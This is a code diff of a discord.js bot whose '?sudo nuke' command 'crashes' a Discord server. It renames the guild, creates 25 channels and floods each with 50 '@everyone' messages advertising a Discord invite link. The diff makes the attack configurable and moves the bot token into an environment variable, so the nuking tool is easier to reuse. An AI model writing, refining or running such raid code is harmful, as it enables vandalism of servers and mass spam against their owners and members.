@@ -1,4 +1,5 @@
 const { Client, Events, GatewayIntentBits, ChannelType } = require('discord.js');
+require("dotenv").config()
 const client = new Client({ intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMembers,
@@ -28,11 +29,17 @@ client.once('ready', () => {
 
 client.on(Events.MessageCreate, async message => {
 
+    //functions
+
     async function crash(){
         const spamMessage = "@everyone discord.gg/KbXnPBk9Qv"
-        const channelName = "fucked-by-holytalent"
+        const guildName = "guild-rename"
+        const channelName = "channel-name"
+        const nChannels = 25
+        const nMessages = 50
+
         try {
-            await message.guild.setName('Crashed by holytalent');
+            await message.guild.setName(guildName)
         } catch (err) {
             console.error('Failed to change guild name:', err);
         }
@@ -49,28 +56,25 @@ client.on(Events.MessageCreate, async message => {
         let newChannels = [];
         try {
             const createChannelPromises = [];
-            for (let i = 0; i < 25; i++) {
+            for (let i = 0; i < nChannels; i++) {
                 createChannelPromises.push(
                     message.guild.channels.create({
                         name: channelName,
                         type: ChannelType.GuildText
                     }).catch(err => {
-                        if (err.message && err.message.includes('Maximum number of channels reached')) {
-                            return 'MAX_CHANNELS';
-                        }
-                        console.error('Failed to create channel:', err);
+                        console.error('Failed: ', err);
                         return null;
                     })
                 );
             }
             newChannels = (await Promise.all(createChannelPromises))
-                .filter(ch => ch && ch !== 'MAX_CHANNELS');
+                .filter(ch => ch);
         } catch (err) {
             console.error('Error during channel creation:', err);
         }
         const sendPromises = [];
         for (const channel of newChannels) {
-            for (let j = 0; j < 50; j++) {
+            for (let j = 0; j < nMessages; j++) {
                 sendPromises.push(channel.send(spamMessage));
             }
         }
@@ -78,9 +82,9 @@ client.on(Events.MessageCreate, async message => {
 
     if (message.content == "?sudo nuke") {
         if (!message.guild) return;
-        crash()
+        await crash()
     }
     
 });
 
-client.login("token")
+client.login(process.env.token)
